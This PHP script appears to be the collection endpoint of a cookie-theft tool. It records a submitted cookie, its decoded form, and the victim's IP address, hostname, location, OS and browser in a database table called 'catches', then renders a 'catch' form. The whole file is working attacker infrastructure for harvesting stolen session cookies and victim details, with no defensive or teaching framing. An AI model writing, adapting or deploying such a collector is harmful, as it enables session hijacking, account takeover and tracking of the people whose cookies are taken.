<?php
	require_once("Core/init.php");

	$Database = new Database();

	if(Input::Exists()) {
		$Data = array(
			"id" => Hash::Make(),
			"cookie" => (Input::Get("cookie-value") !== null && !empty(Input::Get("cookie-value"))) ? Input::Get("cookie-value") : "No cookie set",
			"decoded_cookie" => (Input::Get("decoded-cookie") !== null && !empty(Input::Get("decoded-cookie"))) ? Input::Get("decoded-cookie") : "Nothing to decode",
			"ip_address" => Input::Get("ip-address"),
			"user_agent" => Input::Get("user-agent"),
			"local_hostname" => Input::Get("local-hostname"),
			"hostname" => Input::Get("hostname"),
			"location" => Input::Get("location"),
			"client_os" => Input::Get("client-os"),
			"client_browser" => Input::Get("client-browser"),
			"catch_date" => StringFormatter::GetDateTime()
		);

		$Database::Insert("catches", $Data);
	}

	$IPAddress = Client::GetIP();
	
	HTMLBuilder::CatchHead();
	HTMLBuilder::CatchForm($IPAddress, Client::GetLocation($IPAddress), Client::GetUserAgent());
?>
